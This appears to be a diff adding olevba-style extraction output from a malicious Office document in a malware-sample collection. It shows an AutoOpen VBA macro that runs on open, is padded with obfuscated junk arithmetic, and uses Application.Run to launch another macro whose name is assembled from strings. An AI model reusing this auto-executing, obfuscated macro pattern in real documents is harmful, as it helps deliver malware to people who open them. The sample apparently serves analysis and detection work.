@@ -1,0 +1,26 @@
+Filename     : ./macros/a6e41fef1ff8cc44e9c035b45fde45788838454390a68c9102dd6cd9c384dba0
+OLE stream   : Macros/VBA/wNswGIA
+VBA filename : wNswGIA.cls
+----------------------------------------
+Attribute VB_Name = "wNswGIA"
+Attribute VB_Base = "1Normal.ThisDocument"
+Attribute VB_GlobalNameSpace = False
+Attribute VB_Creatable = False
+Attribute VB_PredeclaredId = True
+Attribute VB_Exposed = True
+Attribute VB_TemplateDerived = True
+Attribute VB_Customizable = True
+Sub AutoOpen()
+On Error Resume Next
+Select Case zItsLo
+Case 26173
+kcIrs = CStr(24551 * Log(UjrMH) * 87768 - vsYcs)
+oGrTnA = 6843
+End Select
+Application.Run TzlRvk + "jpWcZGz" + kJjqHh, oSGnAo + pwnTqYKXS + BUiwW
+Select Case dkpErJ
+Case 20562
+jGuMJ = CStr(36706 * Log(jolkJ) * 25348 - ZMzzO)
+SfDUYI = 27030
+End Select
+End Sub
